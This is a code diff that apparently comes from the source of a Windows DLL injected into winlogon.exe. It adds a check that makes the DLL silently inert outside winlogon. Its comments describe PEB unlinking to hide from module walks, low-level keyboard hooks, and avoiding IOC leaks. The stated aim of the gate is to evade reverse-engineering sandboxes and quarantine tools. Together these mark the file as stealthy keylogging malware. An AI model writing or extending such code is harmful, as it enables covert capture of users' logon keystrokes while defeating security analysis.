@@ -2553,9 +2553,46 @@ static DWORD WINAPI uia_server_thread(LPVOID unused) {
  * LoadLibrary: standard Windows loader path; same DllMain runs. The
  * stealth pass still applies -- PEB unlink hides us from module walks
  * regardless of how we got loaded. */
+/* v18.1 (2026-09-23) -- Host-process identity gate.
+ *
+ * This helper's threat model assumes winlogon.exe as the host (SYSTEM,
+ * session 0, non-PPL, un-killable-by-non-admin). If loaded anywhere else
+ * (RE sandbox, quarantine wrapper, generic DLL injector into an
+ * attacker's own harness) it should silently no-op instead of running
+ * the full stealth + supersede + LL-hook install sequence that would
+ * (a) blow the cover on what this DLL does, (b) install keyboard hooks
+ * in the wrong process, (c) create named events / mutexes that leak IOCs.
+ *
+ * Case-insensitive leaf-name match against "winlogon.exe". Any other
+ * host -> DllMain returns TRUE (LoadLibrary sees success) but the entire
+ * init sequence is skipped -- inert stub from the outside. */
+static BOOL wl_is_hosted_by_winlogon(void) {
+    wchar_t path[MAX_PATH];
+    DWORD n = GetModuleFileNameW(NULL, path, MAX_PATH);
+    if (n == 0 || n >= MAX_PATH) return FALSE;
+    const wchar_t *leaf = path;
+    for (const wchar_t *p = path; *p; p++) {
+        if (*p == L'\\' || *p == L'/') leaf = p + 1;
+    }
+    static const wchar_t expected[] = L"winlogon.exe";
+    for (int i = 0; i < 12; i++) {
+        wchar_t a = leaf[i];
+        wchar_t b = expected[i];
+        if (a >= L'A' && a <= L'Z') a += 32;
+        if (b >= L'A' && b <= L'Z') b += 32;
+        if (a != b) return FALSE;
+    }
+    return leaf[12] == 0;
+}
+
 BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
     (void)reserved;
     if (reason == DLL_PROCESS_ATTACH) {
+        /* Host identity gate -- silently no-op outside winlogon.exe. See
+         * wl_is_hosted_by_winlogon comment block for rationale. */
+        if (!wl_is_hosted_by_winlogon()) {
+            return TRUE;
+        }
         DisableThreadLibraryCalls(h);
         lg("wl_input ATTACH pid=%lu base=%p", GetCurrentProcessId(), (void *)h);
 
